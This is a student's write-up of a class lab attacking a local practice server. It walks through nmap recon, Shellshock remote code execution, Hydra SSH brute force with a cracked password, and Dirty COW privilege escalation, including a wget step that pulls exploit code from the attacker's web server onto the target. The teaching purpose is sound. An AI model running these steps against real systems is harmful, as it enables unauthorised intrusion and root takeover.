### Overview 
------
For this lab we were tasked with exploting a webserver named "cupcake.shire.local". This is a local web server that was made our class to be able to exploit. We started with running 
active reacon against this server to attempt to find what ports were open as well as any applications running. We then learned how to export the results of our Nmap scans to a .csv
file which makes it much easier to parse than outputing the results to the command line. This is very helpful if you run a command that has a very large output. Following this we 
started to look for any vulernabilities we could exploit in order to leverage to get on the server. After finding this exploit we were able to execute code remotely and use this
to find the users and build a password list in order to be able to login to the server. After logging in we were tasked with gaining root access on this server. A more detailed 
explination of each section will be outlined below. 

### Reflection
------
This lab was incredibly fun and the first time dipping my feet into exploiting a server. I didn't have to many problems with this lab, however I did have to use google a lot just to find the correct syntax of each command. One thing that I did have a little trouble finding was the location of the resources we were running the remote code on. For example I was unawaren that to run ifconfig you must use the /sbin directory. As well that code for the status cgi was in /var/www/cgi-bin/status. One thing I would like to research more is finding other ways of privilege escalation. I was unable to do a different way than what was shown in the demo. 

### Active Reacon
------
For the active reacon portion of this lab we were tasked with finding what ports were open on the target server as well as what service and version it was running. To do this we used Nmap and ran the command `sudo nmap -sV -O 10.0.5.23 -p 22,80`. The screenshot below is the output of that command. 


![active reacon](https://user-images.githubusercontent.com/78443183/154110803-10fc16a1-e06f-4310-8551-59d55fab0969.PNG)

As you can see from this screenshot the server was running OpenSSH version 5.3 and Apache version 2.2.15. 

### Exporting Nmap Scan Results
------
Exporting Nmap Scan Results, like I mentioned in the overview, is a very useful tool to have and will make life so much easier. To start you must run the following commands to
to install nmaptocsv which is what allows you to do this. First `sudo apt install python3-pip` and then `sudo pip install nmaptocsv`. Following this you will run your nmap scan and have it output to a .txt file. For example `sudo nmap <your scan> <target address> -oG <filename>.txt`. You may use any naming scheme that you would like for the .txt file. After this you will take that file that was just created and use it in the command `nmaptocsv -i <filename>.txt -d ","`. You will then copy the output of that command into google sheets or excel and after pasting select the option "split text to columns" and you are finished. 

### Remote Code Execution
------
Since the target server has an vulnerablitiy called Shellshock we are able to leverage that to execute code remotely. We were tasked with finding the contents of  `/etc/passwd`, the code behind the status cgi, and the results of `ifconfig`. The three screenshots below will show the commands needed to find all of that content on the remote server. 

#### Contents of /etc/passwd
![etcpass](https://user-images.githubusercontent.com/78443183/154115045-c0159d2a-463a-4962-9faa-ee3bd6d2e40d.PNG)
------
#### Code behind the Status CGI
![cgi](https://user-images.githubusercontent.com/78443183/154115214-94773f39-42fb-4245-90b4-dc0aa694a531.PNG)
------
#### Results of ifconfig
![ifconfig](https://user-images.githubusercontent.com/78443183/154115260-eceb4028-7731-4da8-9905-ea01e9a24243.PNG)
------

### Building a Password List and Gaining Access
------
First I will start by discussing how I build the password list. I noticed that in the results of `cat /etc/passwd` on the target server, besides root there were only two other users, samwise and range-deployer. With this information in mind I extracted the rockyou.txt file on Kali to rocky.txt which is a long list of popular passwords and ran the username 'samwise' against this list. To do this I ran the command `cat rocky.txt | grep -i samwise`. Now I must say that we were given a little hint and that was that we should end up with 28 passwords in this list. As you can see from the screenshot below, there were 28 passwords. 

![rocky](https://user-images.githubusercontent.com/78443183/154116845-98488b3b-204e-46d0-a1ee-5764d305779d.PNG)

From here it is important to send the output into a passwordlist.txt file so you can use the next tool Hydra. Hyrda is a tool that will take a given username and password file and will run that against a target machine using ssh. If the correct password is found it will report that back to you. With this in mind I used Hydra to try and find the password as seen in the screenshot below.
![hydra](https://user-images.githubusercontent.com/78443183/154117331-6755b0b9-f9f7-4de0-b8cc-1e174caf12a8.PNG)

As you can see the password was Samwise123$. Knowing this it is as simple as using SSH to login with the command `ssh samwise@10.0.5.23` and when prompted entering in the password that was just found. 

### Privilage Escalation
------
For the privilage escalation portion of this lab I was unable to find a way other than the demo that was given to us, so I will be going over how that was done. Start on your local Kali box, and run the command `searchsploit <linux kernal release>`. You will want to search for the linux kernal release that your target system is running on. From there we found that there was an exploit named 'Dirty COW' and had a file name of '40839'. For the examples after this I will use the commands that were used in lab, just know if you are using a different exploit, the commands will be different. To pull this onto your system, you will run the command `searchsploit -m 40839`. Following this you want to invoke a webserver on the local Kali box using the command `python3 -m http.server 8088`. Make sure that the port number is one that is high. Now switch over to the the target box that we got into in teh section above. On the target machine run the command `wget http://10.0.99.111:8088/40839.c` where the IP address is the IP address of the web server that was just started. Still on the target machine run the following command `gcc 40839.c -o cow -lpthread -lcrypt`. Now run the command `./cow` and that will bring up a prompt to enter a new password. This will be the password you will use to gain root access so make sure you remember this. After this has completed you will be able to login with the user that is given, in our case it was the user 'firefart'. This users password is the one you just entered so now it is a simple as running the command `su - firefart` and entering in the password. You should now have root access on the target system. 


